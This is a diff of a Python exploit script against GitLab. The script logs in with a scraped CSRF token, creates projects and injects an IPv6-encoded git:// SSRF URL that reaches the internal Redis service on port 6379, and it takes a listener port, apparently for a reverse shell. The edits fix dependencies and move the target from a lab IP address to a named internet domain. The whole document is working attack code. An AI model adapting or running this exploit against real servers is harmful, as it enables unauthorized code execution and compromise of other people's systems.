@@ -14,7 +14,8 @@ from bs4 import BeautifulSoup
 import sys
 import base64
 import urllib
-from random_words import RandomWords
+import random 
+import string
 import argparse
 import os
 import time
@@ -39,13 +40,13 @@ lport = args.p
 #Retrieve CSRF Token
 
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
-gitlab_url = "http://10.10.10.220:5080"
+gitlab_url = "http://missionit.the-x.country:5080/"
 request = requests.Session()
 print("[+] Retrieving CSRF token to submit the login form")
 time.sleep(1)
 page = request.get(gitlab_url+"/users/sign_in")
 html_content = page.text
-soup = BeautifulSoup(html_content,features="lxml")
+soup = BeautifulSoup(html_content,"html.parser")
 token = soup.findAll('meta')[16].get("content")
 
 
@@ -89,8 +90,9 @@ time.sleep(1)
 ipv6_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2Fssrf.git"
 
 
-r = RandomWords()
-project_name = r.random_word()
+letters = string.ascii_lowercase
+result_str = ''.join(random.choice(letters) for i in range(4))
+project_name = result_str
 project_url = '%s/%s/'%(gitlab_url,username)
 
 print("[+] Creating Project")
@@ -151,7 +153,7 @@ elif (http_server=="Y") or (http_server=="y"):
 		 
 		project_page = request.get(gitlab_url+"/projects/new")
 		html_content = project_page.text
-		soup = BeautifulSoup(html_content,features="lxml")
+		soup = BeautifulSoup(html_content,"html.parser")
 		project_token = soup.findAll('meta')[16].get("content")
 		namespace_id = soup.find('input', {'name': 'project[namespace_id]'}).get('value')
 		urlencoded_token1 = project_token.replace("==","%3D%3D")
@@ -216,7 +218,7 @@ elif (http_server=="Y") or (http_server=="y"):
 
 		project_page = request.get(gitlab_url+"/projects/new")
 		html_content = project_page.text
-		soup = BeautifulSoup(html_content,features="lxml")
+		soup = BeautifulSoup(html_content,"html.parser")
 		project_token = soup.findAll('meta')[16].get("content")
 		namespace_id = soup.find('input', {'name': 'project[namespace_id]'}).get('value')
 		urlencoded_token1 = project_token.replace("==","%3D%3D")
